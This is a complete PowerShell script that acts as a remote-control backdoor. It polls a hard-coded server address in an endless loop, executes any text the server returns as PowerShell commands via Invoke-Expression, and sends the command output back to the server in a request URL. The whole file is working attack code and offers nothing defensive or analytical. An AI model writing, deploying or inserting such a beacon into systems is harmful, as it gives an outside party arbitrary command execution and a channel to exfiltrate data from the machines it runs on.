# Define the URL of the server endpoint
$serverUrl = "http://192.168.166.197:8000"

# Loop to continuously make HTTP requests to the server
while ($true) {
    try {
        # Make an HTTP GET request to the server
        $response = Invoke-WebRequest -Uri $serverUrl -Method Get

        # Extract the content of the response
        $responseData = $response.Content

        # Execute the received data as PowerShell commands
        $output = Invoke-Expression $responseData 2>&1 | Out-String

        # Send the output back to the server
        Invoke-WebRequest -Uri "$serverUrl?output=$output" -Method Get
    } catch {
        # Handle any errors that may occur during the communication
        Write-Host "Error occurred: $_"
    }

    # Add a delay before making the next request (optional)
    Start-Sleep -Seconds 10
}
